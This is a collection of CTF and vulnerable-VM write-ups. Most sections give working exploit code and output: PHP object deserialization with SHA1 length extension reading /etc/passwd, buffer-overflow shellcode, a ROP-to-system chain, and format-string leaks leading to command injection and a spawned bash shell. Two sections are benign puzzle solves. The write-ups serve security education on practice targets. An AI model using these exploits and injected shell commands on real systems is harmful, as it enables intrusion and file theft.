$ cat phpscript.php
<?php
require_once('steves_list_backup/includes/classes.php');
$filter = [new Filter('/^(.*)/e', 'file_get_contents(\'/etc/passwd\')')];

$text = "file_get_contents";
$text = htmlspecialchars($text);

$title = "yay_flag";
$title = htmlspecialchars($title);

$post = new Post($title, $text, $filter);
?>

$ php phpscript.php 

<!-- POST yay_flag: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
...
obo:x:1003:1003::/home/obo:/bin/bash
```

Bingo! Now we have a working malicious Post. What can we do with this? 

# Putting it all together

Let's go back to `cookies.php` in order to see where our custom Post can be used.
```php
  6     if ($hash !== $_COOKIE['custom_settings_hash']) {
  7       die("Why would you hack Section Chief Steve's site? :(");
  8     }
  9     // we only support one setting for now, but we might as well put this in.
 10     $settings_array = explode("\n", $custom_settings);
 11     $custom_settings = array();
 12     for ($i = 0; $i < count($settings_array); $i++) {
 13       $setting = $settings_array[$i];
 14       $setting = unserialize($setting);
 15       $custom_settings[] = $setting;
 16     }
```

After the hash passes its check, the decoded cookie is split on '\n'. For each value in the resulting array, it is unserialized and appended to the `$custom_settings` array. The fun feature of `unserialize()` deals with objects. Once an object is unserialized, it is essentially instantiated. Which means that when it goes out of scope, its destructor gets called. 

With this knowledge, our work flow is below:
* Create a Post class with a malicious filter that will `file_get_contents` a file (or instance the flag)
* Serialize the object
* Append the serialized object to the initial cookie data, being sure to seperate the object with a '\n'
* Rehash the new data to pass the hash check
* Watch the delicious flag fly our way

Below is the final product:

```python
$ cat win.py
import subprocess
import urllib
from pwn import *
import commands
import sys
import hlextend
import urllib2
import cookielib
import requests
import subprocess

def php_urlencode(s):
    '''Return php urlencoded string'''
    print "ENCODE: " + s
    s = s.replace("\x00", "\0")
    encode_php = "<?php $text = <<<EOD\n{}\nEOD;\necho urlencode($text);\n?>".format(s)

    with open('encode_me.php', 'w') as f:
        f.write(encode_php)

    output = subprocess.check_output('php encode_me.php', shell=True)
    return output

url = 'http://steveslist.picoctf.com'
flag_file = '/home/daedalus/flag.txt'
php_script = """
<?php
require_once('steves_list_backup/includes/classes.php');
$filter = [new Filter('/^(.*)/e', 'file_get_contents(\\\'{}\\\')')];

$text = "file_get_contents";
$text = htmlspecialchars($text);

$title = "yay_flag";
$title = htmlspecialchars($title);

$post = new Post($title, $text, $filter);

$post_ser = serialize($post);

$ser = $post_ser;
echo $ser;
?>
""".format(flag_file)

with open('phpscript.php', 'w') as f:
    f.write(php_script)

php_output = subprocess.check_output('php phpscript.php', shell=True, stderr=subprocess.STDOUT)
php_output = php_output.split('<')[0].split('\n')[1]

original_hash = '2141b332222df459fd212440824a35e63d37ef69'
original_data = 'b:1;'
# '\x0a' is our new line delimiter
appended_data = '\x0a' + php_output
key_length = 8

sha = hlextend.new('sha1')
cookie = sha.extend(appended_data, original_data, key_length, original_hash)
cookie_hash = sha.hexdigest()

output = php_urlencode(cookie)
cookies = {'custom_settings_hash': cookie_hash,
           'custom_settings': output}
results = requests.get(url, cookies=cookies).text
print [line for line in results.split('\n') if 'yay_flag' in line]
```

And we get our flag:
```python
$ python win2.py 
[u'<!-- POST yay_flag: D43d4lu5_w45_h3r3_w1th_s3rialization_chief_steve']

```








### File: ctf-writeups/polictf-2015/johns-library/README.md

# John's Library
Do you like reading books? here we have the best collection ever! you can even save some books for future reading!! enjoy noob!

## Recon
We are presented with the following menu upon connection:
```
Welcome to the jungle library mate! Try to escape!!

r - read from library
a - add element
u - exit
```

There is two bits of functionality that we have access to

### Add book to library
```
 r - read from library
 a - add element
 u - exit
a
Hey mate! Insert how long is the book title:
8
deadbeef
```
With adding a book, we input two values:
* Length of the text
* The text itself

The interesting bit is that the length of each book is stored in a global array located at `0x804a060`. The text is stored in a buffer located on the stack. This address is passed to both the read and add functions as an argument.

### Reading from the library
```
 r - read from library
 a - add element
 u - exit
r
Insert the index of the book you want to read: 0
deadbeef
```

This function takes the index of a book and reads the information stored at that index. This calculation is done by reading the corresponding stored length from `0x804a060 + index`
and adding that length to the beginning of the buffer passed to the function (which is also on the stack).

### Vulnerabilities
There are two bugs in the code.
* The data stored in the buffer is read via a `gets()` call, causing a traditional stack overflow. This is exploited upon exiting the program.
* The length of the book isn't checked for being negative. This allows us to arbitrarily read valvues on the stack. It just so happens that the start of the buffer is pushed on the stack as a parameter to both read and add functions. An example stack is below (addresses are not accurate)

```
+-------------------+
| Pointer to buffer | 0x400000
+-------------------+
| .....             |
+-------------------+
| Buf               | 0x40001b
|                   |
|                   |
+-------------------+
```


### Exploit
The stack is randomized on the remote server. We can't hard code the stack address, as we won't know what it is at execution. We have to leak this address.

By supplying a `-0x1b` length for the first book and then reading that book's index, we can actually read the beginning of the buffer, giving us a static address to jump to for our shellcode.


Exploit will work as follows:
* Create a book with `-28` length (data for the book is irrevelent)
* Read that book via index 0 and retrieve the 4 bytes of the stack
* Add a second book, but this time overflow via `gets()` with our shellcode at the beginning of the buffer and returning to our leaked stack address.
* Exit the program via `u`
* ???
* Profit

### Exploit code

```python
from pwn import *

"""
Both functions are given a pointer to a stack address (named BUFF)
Add function (overflow):
Drops the given length into a global buffer starting at 0x804a060
There is no negative check, so feeding a negative value passes the check
Vulnerable gets() function drops input into BUFF

Read (mem leak):
Takes the previously given length from add and adds that offset in BUFF
Because we can use negative values, we can looks backwards on the stack
to discover the beginning address of BUFF

Exit (trigger):
The overflow from the add isn't exploited until exiting the program
"""


# r = process('./johns-library')
r = remote('library.polictf.it', 80)

# Debugging help with gdb
'''
gdb.attach(r, """
bp 0x8048640
bp 0x8048742
c
""")
'''

log.info("Setting up leak of buffer")
r.sendline('a')
r.sendline(str(-28)) # Set len to subtract to find original buffer location
r.sendline()

log.info("Leaking buffer")
r.sendline('r')
r.sendline('1')
r.recv()
r.recv()
r.recvuntil('read: ')

ret = r.recv()[:4]

log.info('Got buffer: {}'.format(ret[::-1].encode('hex')))

log.info("Preparing shellcode")
shellcode = '\x90' * 900 + asm(shellcraft.sh())

payload = shellcode
payload += cyclic(cyclic_find('aaks') - len(shellcode))
payload += ret
payload += 'a' * (1000 - len(payload))

log.info("Sending shellcode")
r.sendline('a')
r.sendline(payload)

log.info("Exiting problem, causing the exploit")
r.sendline('u')

log.success("And your shell...")
r.interactive()
```



### File: ctf-writeups/polictf-2015/johns-shuffle/README.md

# John's Shuffle
John is completely drunk and unable to protect his poor stack.. Fortunately he can still count on his terrific shuffling skills.

```
>>> from pwn import *
>>> elf = ELF('johns-shuffle')
    Arch:          i386-32-little
    RELRO:         Partial RELRO
    Stack Canary:  No canary found
    NX:            NX enabled
    PIE:           No PIE
```

## Recon
The first shot at overflowing by throwing a ton of `A`'s worked. I don't actually know what the vulnerbility was, as I didn't open the binary in IDA.

Once we have control of EIP, and the fact that NX is on, we have to start ROP'ing. Using `pwntools`, we immediately see that we have `system` in our binary, but not the string `/bin/sh`. In order to ROP into `system` we have to have a pointer to the string `/bin/sh`. No worries though, because we also have `read` in our binary. 

## Exploit
* Overflow the stack to control EIP.
* ROP into the following chain:
    * `read` to add `/bin/sh` into the .bss segment
    * `system` into the .bss segment where we read our `/bin/sh` string
* ???
* Profit

The binary itself randomizes the GOT each connection, so the exploit can take a while to actually land while waiting for our `system` and `read` addresses to line up properly. Give it a bit, and the exploit lands perfectly.

### Exploit code
```python
from pwn import *

elf = ELF('johns-shuffle')
rop = ROP(elf)

add_esp_8 = rop.pivots[8]
system = elf.symbols['system']

# Found system in ELF
log.info("System: {}".format(hex(system)))

# ROP shellcode
# read '/bin/sh' into a known location
# call /bin/sh from known location via system
rop.read(0, elf.bss(), 8)
rop.system(elf.bss())

# Set up our payload 
payload = 'b' * 166
payload += str(rop)
payload += cyclic(1000)

print rop.dump()

log.info("You can walk away.. this might take while..")
log.info("Waiting on the randomization to work")
while True:
    try:
        # r = process('./johns-shuffle')
        with remote('shuffle.polictf.it', 80) as r:

            # Debug code
            '''
            gdb.attach(r, """
            bp {}
            c
            """.format(hex(elf.symbols['read'])))
            '''

            # PWN
            r.sendline(payload)

            # Sleep enough to wait for the read() call to hit
            sleep(0.2)

            # Write /bin/sh in the .bss segment to use with our system() ROP
            r.sendline('/bin/sh\x00')

            # Command to send to our new shell
            r.sendline('cat /home/ctf/flag')

            # Be sure to retrieve the flag from the socket
            for _ in xrange(4):
                output = r.recv()
                if 'flag' in output.lower():
                    log.info('FLAG: {}'.format(output))
                    raw_input()
    except:
        pass
```



### File: ctf-writeups/saintcon-pre-4/README.md

# SAINTCON 2015 PRE-4

```
-- CIPHERTEXT --
AEBRVHWWMQHURVWFFIKVYFUCDG
To Decrypt this Message, you will need to learn how a US President encrypted messages while in Paris France.

The PSK sequence you need to know is:
5,24,4,20,23,2,11,22,19,15,10,18,16,1,14,3,25,9,6,12,26,7,13,17,21,8
```

## Solve

Began with the obvious of throwing the ciphertext into [quipquip](http://www.quipquip.com) for easy pickings, no dice. Actually opened up the pdf to see a 2x2 grid of letters and then a circle at the bottom the size of a paper towel roll. 

![2x2 grid](tumblers.png)

This immediately sparked the memory of the Da Vinci Code cryptex. 

![Cryptex](cryptex.jpg)

I began doing some awkward transformations of shifting each letter in the cipher text a number in the PSK:

```
A >> 5
E >> 24
B >> 4
R >> 20
... ect
```

Realizing this was a terrible idea, went back to the PDF to realize that there are numbers at the top of the 2x2 grid. It then became obvious that the PSK given is the order of the tumblers needed to solve the ciphertext.

The solution script does the following:
* Extracts each individual tumbler
* Arranges the tumblers in order based on the PSK
* Rotates each tumbler to match the ciphertext
* Prints every resulting line

Upon execution, we are given the following result:

```
AEBRVHWWMQHURVWFFIKVYFUCDG
XCDSNUMEXWPMMLNGHMNXOYGVET
KXVDCRBLWOURKYSBVPDJAMFBUW
MJZZIICYVMDNHTYMZXUDIIZFHK
BQNMFJJJSUJFYFPQKYOYTNWJKB
SBFTPZVDUHWLGUJYQEQWEWIONA
PFXQTQPXBCFQEWLSTSYOQSSRVL
HTTPHCSAINTCONORGJEFFERSON <--- Looks like a web page
IVKHZKAUGJNIIMFPMTRBDHTIPV
TMQUXWZOEDGBXCGUWQPEBBMNAD
OYUWSYENFLIJNJKTCBZAPJAZRE
GAEXRPRKHKMHQDXDRAJTSOXXQX
WKPKOXDCDVVPDKCOPDLRCPPYSP
RLHGWVLFAIEVJZILSZWPXVHMXI
FHSVQMKQKYOWVPQAJOTCVQDPBS
LZYOAEOVNRQYBBDZDRXNRKBAFM
UDLAKSURJPADLSBXLUBQLZCUYF
YUICLLGSPFKGTGUNBGSUJAVQGO
NPMIGTYTOTBKFETKYVILUUEWMQ
EIOEUNNMZGZZWRMVAKCINDYLCH
DGAJJDTHLSXSAXVJOFFZMTKHIY
JOGLEGQIRAYOCAECNHHSZGODJJ
ZNWFBBFPCXCTSQZHECVGKCQTLZ
VSRBMAHGQZSAZIHEILAHWRJGWC
CWJYDOIZYBLEPHAWUNMMHXLETR
QRCNYFXBTERXUORIXWGKGLNKZU
```

Checking out the website:

```
PROVE YOU SOLVED IT!
DM TWEET @SAINTCON: The Ciphertext three positions below the Plaintext
If you hate Twitter, an email to tj@saintcon.org will work too.

SOLVED BY: NOBODY YET
```

I don't think I was the first, but it was a great challenge nonetheless! Thanks to @saintcon for the pre-challenge and looking forward to more puzzles in the future.

## Final solution
```python

from collections import deque

ciphertext = 'AEBRVHWWMQHURVWFFIKVYFUCDG'
cipher = '''
R C X G O R U Q P T U V X L Z N Q S P V P I T M K E
X K N W G P D H X N G X P O B Q W O O O A P H Y Q Q
A W K R W Z T Y Y G Y J H F E D L T Z A R G Z A T F
Q Y V J R J G J E I N D D G Q J H A L C Q Z X K G D
I P J C F L C Z S M T Y B K W V D E R I S B S L M B
H X C B L W R C J V Q W C X O B T X C E X W R H W P
O V H D U T X R T E F O V C M L G U Q J B E O Z C S
V M E V Y X L U Q O H F E I U T E M Y L F L W D R C
L E W Z N B F G B Q I B Y Q H F K R T F Y Y Q U P X
Y S I N E S Y T A A X E K D C W C N M B G J A P S V
T L F F D I M W D K W A O B N A V F X Y M D K I J R
F T G X J C I K Z B M T Q U J C B L W N C X L G D L
U N B T Z F N B O Z B R J T D S F Q V R I A G O L J
W D M K V H W A R X C P L M L Z J C S S J U U N B U
N G Q Q C V S L U Y J C N V K P O I U D L O J S Y N
M B Y U Q A E N G C V N U E V U R B B Z W N E W A M
C A S E A M H V V S P Q G Z I R S J I M T K B R O Z
J O R P X G B D K L S U F H Y M I H G T Z C M E N K
D F P H K K J E F R A L Z A R K N P E Q D F D C E W
K H U S M N O X H H Z I W R P H Z V F P E Q Y X I H
Z U T Y B D P P C P E Z I W F Y X W H H U V V J U G
P R D L S U V I L U R S S N T G Y Y D U H R N Q X Y
B I O I P O Q S N D D G R S G E M D A W K S C B F O
S J L M H Q K M W J L H T Y S O P G K X N T I F H A
G Z A O I Y Z F I W K M M P A I A K N K V M F T V I
E Q Z A T E A O M F O K A J X X U Z J G O H P V Z T
'''

# Convert grid to 26 individual tumblers
cipher = zip(*[x.split() for x in cipher.splitlines()[1:]])

tumblers = []
final = []
psk = [5,24,4,20,23,2,11,22,19,15,10,18,16,1,14,3,25,9,6,12,26,7,13,17,21,8]

# Create cryptex
for index in psk:
    tumblers.append(cipher[index-1])

# Rotate tumblers to read ciphertext
for index,tumbler in enumerate(tumblers):
    tumbler = deque(tumbler)
    while tumbler[0] != ciphertext[index]:
        tumbler.rotate(1)

    final.append(list(tumbler))

# Flip 2D array to read everyline
"""
a b
c d
 |
 v
a c
b d
"""
final = zip(*final)

# Print all
for f in final:
    print ''.join(f)
```




### File: ctf-writeups/seccon-ctf-2014/lets-disassemble/README.md

# Lets Dissemble

We are given a service that returns hex bytes that are assembly instructions.
Our job is to create a client to respond with the correct instruction
cooresponding to the given assembly.

What language do we disassemble to, you might ask? Let's ask radare!

## Finding the given language

I used [radare](http://github.com/radare/radare2) for this task. Radare is a multi-architecture and multi-platform command line reverse engineering toolkit. One tool in the tool box is `rasm2` which can take hex digits and convert them into the cooresponding assembly instruction. 

I looked at the supported languages via `rasm2 -L`

```bash
$ rasm2 -L
_dA_  8          8051        PD      8051 Intel CPU
_dA_  16 32      arc         GPL3    Argonaut RISC Core
_dAe  16 32 64   arm         BSD     Capstone ARM disassembler
adA_  16 32 64   arm.gnu     GPL3    Acorn RISC Machine CPU
_d__  16 32      arm.winedbg LGPL2   WineDBG's ARM disassembler
_dA_  16 32      avr         GPL     AVR Atmel
adAe  16 32      bf          LGPL3   Brainfuck
_dA_  16         cr16        LGPL3   cr16 disassembly plugin
_dA_  16         csr         PD      Cambridge Silicon Radio (CSR)
adA_  32 64      dalvik      LGPL3   AndroidVM Dalvik
ad__  16         dcpu16      PD      Mojang's DCPU-16
_dA_  32 64      ebc         LGPL3   EFI Bytecode
_dAe  8          gb          LGPL3   GameBoy(TM) (z80-like)
_dA_  16         h8300       LGPL3   H8/300 disassembly plugin
_d__             i4004       LGPL3   Intel 4004 microprocessor
_dA_  8          i8080       BSD     Intel 8080 CPU
adA_  32         java        Apache  Java bytecode
_dA_  16 32      m68k        BSD     Motorola 68000
_dA_  32         malbolge    LGPL3   Malbolge Ternary VM
adAe  16 32 64   mips        BSD     Capstone MIPS disassembler
adAe  32 64      mips.gnu    GPL3    MIPS CPU
_d__  16 32 64   msil        PD      .NET Microsoft Intermediate Language
_dA_  16         msp430      LGPL3   msp430 disassembly plugin
_dAe  32         nios2       GPL3    NIOS II Embedded Processor
_dA_  32 64      ppc         BSD     Capstone PowerPC disassembler
_dA_  32 64      ppc.gnu     GPL3    PowerPC
ad__             rar         LGPL3   RAR VM
_dA_  32         sh          GPL3    SuperH-4 CPU
_dAe  32 64      sparc       BSD     Capstone SPARC disassembler
_dA_  32 64      sparc.gnu   GPL3    Scalable Processor Architecture
_d__  16         spc700      LGPL3   spc700, snes' sound-chip
_d__  32         sysz        BSD     SystemZ CPU disassembler
_dA_  32         tms320      LGPLv3  TMS320 DSP family
_dA_  32         v850        LGPL3   v850 disassembly plugin
_dA_  32         ws          LGPL3   Whitespace esotheric VM
_dAe  16 32 64   x86         BSD     Capstone X86 disassembler
a___  32 64      x86.nz      LGPL3   x86 handmade assembler
ad__  32         x86.olly    GPL2    OllyDBG X86 disassembler
_dAe  16 32 64   x86.udis    BSD     udis86 x86-16,32,64
_dAe  32         xcore       BSD     Capstone XCore disassembler
adA_  8          z80         NC-GPL2 Zilog Z80
ad__  8 16       psosvm      BSD     Smartcard PSOS Virtual Machine
_d__  32         propeller   LGPL3   propeller disassembly plugin
_d__  8 16       6502        LGPL3   6502/NES/C64/T-1000 CPU
a___  16 32 64   x86.nasm    LGPL3   X86 nasm assembler
_d__  8 16       snes        LGPL3   SuperNES CPU
a___  16 32 64   x86.as      LGPL3   Intel X86 GNU Assembler
```

By simply looped through this list sending back a response to the server until I received a second question. My initial assumption was that the server is single architecture, so once I found one successful answer, the rest should be easy-peasy.

See [find_language.py](https://github.com/thebarbershopper/ctf-writeups/blob/master/seccon-ctf-2014/lets-disassemble/find_language.py) 

The script stopped at language `z80`. 

```bash
$ rasm2 -d AC -a z80
xor h
```

Using this language moving forward, there was one more small bug to iron out before getting the golden flag.

`rasm2` spit out a few commands where the offset arithmetic was adding a negative number instead of simply subtracting the correct value. The server wasn't too happy about this. The solution was to simply calculate the negative value and replace the offset with the correct subtraction.


After solving 100 problems:
```bash
[*] In: CB23 Out: sla e
[*] In: 85 Out: add a, l
[*] In: EDA9 Out: cpd
[*] In: DDCBAF7E Out: bit 7, (ix-81)
The flag is SECCON{I love Z80. How about you?}
```



### File: ctf-writeups/vulnhub/brainpan3/README.md

Brainpan3 is a typical boot2root VM that we boot and attempt to gain root access. This one is a bit long, but I hope it is entertaining and informative. Strap in!

## Recon

```
nmap -p- 192.168.224.0/24 -Pn --open -T5
```

```
-p- : Poke all 65536 ports
-Pn : Assume each IP address is alive
--open : Only show open ports
-T5 : Scan at the speed of Buzz Lightgear
```

## Step 1

Upon finding port `1337`, we can start having fun with Brainpan. We can setup a small script to easily interact with the service:

```
from pwn import * # pip install --upgrade git+https://github.com/binjitsu/binjitsu.git

HOST = '192.168.224.154'
PORT = 1337

r = remote(HOST, PORT)

r.interactive()
```

Our first image of Brainpan3 is shown below:
```
  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|
  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    | 
  |   |  __ <    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    | 
 ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|

                                                            by superkojiman




AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS

ACCESS CODE: 
```

Even though the text says "A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS", the initial thought was, 'Oh cool, 4 digits, Go Go Gadget Brute Force!'. Turns out, the text wasn't lieing. The number definitely did change after 3 attempts. To Plan B!

Given a login prompt, we could try to overflow the input buffer in an attempt for a stack overflow. The problem with this approach would be that we don't have the binary to do analysis after the overflow. After a nice, hot shower (where all the CTF solutions are generated), the exploitation vector that makes the most sense is looking at format strings.

Let's give some format strings a go!

```
ACCESS CODE: %x.%x.%x.%x.%x.
ERROR #4: WHAT IS THIS, AMATEUR HOUR?
```

Herm.. are they filtering on `%x`? Let's try a different format string.

```
ACCESS CODE: %p.%p.%p.%p.
ERROR #1: INVALID ACCESS CODE: 0xbfcf8b1c.(nil).0x2691.0xbfcf8b1c.
```

Bingo! So we now know that this input is vulnerable to malicious format strings. Since we are looking for a 4 digit access code, we can assume it is probably stored on the stack. Let's try to use `%d`.

```
ACCESS CODE: %d.%d.%d.%d.%d.%d.
ERROR #1: INVALID ACCESS CODE: -1076917476.0.6970.-1076917476.0.10.
```

Ah! What is in the third slot here: `6970`. Let's try that access code:

```
ACCESS CODE: 6970

--------------------------------------------------------------
SESSION: ID-6439
  AUTH   [Y]    REPORT [N]    MENU   [Y]  
  --------------------------------------------------------------


  1  - CREATE REPORT
  2  - VIEW CODE REPOSITORY
  3  - UPDATE SESSION NAME
  4  - SHELL
  5  - LOG OFF

  ENTER COMMAND: 
```

And we are in! Before we proceed further, let's modify our script to automatically get past the access code:

* Send `%d.%d.%d.%d.%d.%d`
* Extract the third element (access code)
* Submit the access code for login

From here, we'll keep adding snippets of code to the script, but for the sake of brevity of the writeup, only the new code will be shown. Our result is below:

```
# r - Our socket object

###
# Get access code
###
r.sendline('%d.' * 3 + 'A' * 80)
r.recvuntil("ACCESS CODE: ")
output = r.recv()
code = output.split('.')[2]

log.info("Code identified: {}".format(code))

r.sendline(code)

r.interactive()
```

## Step 2

Now that we are logged in, we can do a bit more exploration. Oh look, we are already given a shell:

```
ENTER COMMAND: 4
SELECTED: 4
reynard@brainpan3 $ ls
total 0
-rw-rw-r-- 1 reynard reynard 22 May 10 22:26 .flag
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 give
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 up
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 let
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 down
```

Of course, superkojiman would rick roll hackers. Thanks!

We can try to overflow this shell script/binary:

```
reynard@brainpan3 $ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*** stack smashing detected ***: ./shell terminated
```

No dice. Canary is in the way (supposedly).

After more exploration of trying the typical recon commands `whoami`, `uname -a`, ect, we can come to the conclusion that this shell is useless.

Let's try the other options:

```
ENTER COMMAND: 1
SELECTED: 1
REPORT MODE IS DISABLED IN THIS BUILD
```

Looks like report mode is currently disabled. We could try to turn the report on, but how?

### And now for something completely different

```
ENTER COMMAND: 2
SELECTED: 2

CODE REPOSITORY IS ALREADY ENABLED
```

Turning on the code repo enables a web service on port 8080, which also has a `/repo` directory containing the binaries used during this step:

![Web service](repo-directory.png)

Spending a little time with the binaries was interesting to see how they worked, but ultimately, nothing useful came from it. I'm not sure if this was a red herring or if there was another vulnerability here.

### Back to your normal programming

The last functionality that we haven't looked at yet is the `Update Session Name` function:

```
ENTER COMMAND: 3
SELECTED: 3
ENTER NEW SESSION NAME: thebarbershopper 
--------------------------------------------------------------
SESSION: thebarbershopper

  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------
```

Interesting, can we replicate the string format vulnerability of the access code with the session name?

```
ENTER COMMAND: 3
SELECTED: 3
ENTER NEW SESSION NAME: %p.%p.%p.%p.%p.
--------------------------------------------------------------
SESSION: 0xbfcf89cc.0x104.0x252e7025.0x70252e70.0x2e70252e.

  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------
```

Why yes, yes we can. Let's dump a good portion of the stack and see what we have. We'll start by sending 70 `%x.`. Note, we add the period at the end only to allow easier splitting of our resulting string. This allows for easier correlation between the individual format strings and their output.

```
ENTER COMMAND: SELECTED: 3
ENTER NEW SESSION NAME: --------------------------------------------------------------
SESSION: bf9a747c.104.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.ff0a2e78.b77a3c20.bf9a75cc.0.b77a3000.b77a3ac0.b77a4898.b75f7940.b76690b5.b77a3ac0.59.4e.59.b77a38a0.b77a3000.b77a3ac0.
\xff <z\xb7�u\x9a\xbf
  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------
```

We are looking at a lot of repeating values here. 

```
>>> from pwn import *
>>> unhex('252e7825')[::-1]
'%x.%'
```

Looks like those repeating characters are our format string buffer. There is one segment in this format string that is interesting:

```
b77a3ac0.59.4e.59.b77a38a0.b77a3000.b77a3ac0.
>>> for item in 'b77a3ac0.59.4e.59.b77a38a0.b77a3000.b77a3ac0.'.split('.'):
        unhex(item)

'\xb7z:\xc0'
'Y'
'N'
'Y'
'\xb7z8\xa0'
'\xb7z0\x00'
'\xb7z:\xc0'
```

The `Y, N, Y` looks very similar to the `Y, N, Y` of the dialog shown from the command menu. Let's grab where in the format string the `4e` is in order to know how much to overflow.

```python
# Update Session name
r.sendline('3')

# Send format string
shellcode = '%x.' * 70

# Wipe the input buffer so we aren't reading old data
r.clean()
r.sendline(shellcode)
r.recvuntil("SESSION: ")

# Grab the format string output
session_name = r.recvuntil('\n').split('.')

# Isolate the 'N' (0x4e) in our format string
n_index = session_name.index('4e')
log.info("Report 'N' at offset {}".format(n_index))

```

Could we try and use our input buffer to overflow the `N` for report to a `Y` to enable the report? After a few tries of different lengths, we succeed:

```
n_index = session_name.index('4e')
# Resend a buffer of 'Y's up to the location of the 'N'
r.sendline('3')
r.sendline('Y' * (4*(n_index-2) + 1) )
```

```
SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
  AUTH   [Y]    REPORT [Y]    MENU   [Y]  
  --------------------------------------------------------------


  1  - CREATE REPORT
  2  - VIEW CODE REPOSITORY
  3  - UPDATE SESSION NAME
  4  - SHELL
  5  - LOG OFF

  ENTER COMMAND: $  
```

Notice the Report now has `[Y]`! Winning.. Let's see what we can do with reports.

## Step 3

```
ENTER COMMAND: $ 1
SELECTED: 1

ENTER REPORT, END WITH NEW LINE:

$ this is my first report!

REPORT [this is my first report!@
SENDING TO REPORT MODULE

[+] WRITING REPORT TO /home/anansi/REPORTS/20150910050336.rep
[+] DATA SUCCESSFULLY ENCRYPTED
[+] DATA SUCCESSFULLY RECORDED
[+] RECORDED [\xbf\xa3\xa2\xb8����\xa6\xb2����\xb8\xbf����\xa4\xb9\xbf���]
```

From the text, it appears that our report is encrypted in some fashion and is stored at `/home/anansi/REPORTS/20150910050336.rep`. The binary for handing reporting is found in the `/repo` directory, so analyzing that will probably be of use, but we can try some low hanging fruit first before diving into the reverse engineering.

After a few fuzzing attempts, the following is shown:

```
$ `notacommand`

REPORT [`notacommand`rst report!@ing]
SENDING TO REPORT MODULE

sh: 1: notacommand: not found
```

Que wha?! We are given a command not found error message when trying to execute commands via back ticks. Could this mean command execution?

```
$ `whoami`

REPORT [`whoami`mand`rst report!@```]
SENDING TO REPORT MODULE

sh: 1: Syntax error: EOF in backquote substitution
```

Hmm.. we are given error messages. Could we receive command output by piping to stderr?

```
$ `whoami >&2`

REPORT [`whoami >&2`4]
SENDING TO REPORT MODULE

anansi
```

Nice! Now the fun part, let's try to get a shell. 

```
ENTER COMMAND: $ 1

ENTER REPORT, END WITH NEW LINE:

`/bin/bash -i >&2`

REPORT [`/bin/bash -i >&2`]
SENDING TO REPORT MODULE

bash: cannot set terminal process group (5677): Inappropriate ioctl for device
bash: no job control in this shell
anansi@brainpan3:/$ whoami
anansi
anansi@brainpan3:/$ uname -a
Linux brainpan3 3.16.0-41-generic #55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux
anansi@brainpan3:/$  
```

And we have a user shell! As normal, let's modify our exploit script to retrieve a shell for us automagically:

```python
###
# Get user shell
###

for command in ['uname -a', 'whoami', 'id']:
    r.clean()
    r.sendline('1')
    r.sendline('$({} >&2)'.format(command))

    r.recvuntil("SENDING TO REPORT MODULE")
    output = r.recvuntil('[+]').split('\n')[2]
    log.success("{} - {}".format(command, output))

r.clean()
r.sendline('1')
r.sendline('$(/bin/bash -i >&2)')

r.interactive()
```

## Step 4

Time to begin basic recon of the `anansi` shell:

```
anansi@brainpan3:/$ $ whoami
anansi

anansi@brainpan3:/$ $ uname -a
Linux brainpan3 3.16.0-41-generic #55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux

anansi@brainpan3:/$ $ id
uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
```

Assuming we need to do some sort of privilege escalation, let's look for SUID binaries:

```
anansi@brainpan3:/$ $ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/sbin/pppd
/usr/sbin/uuidd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/pt_chown
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/gpasswd
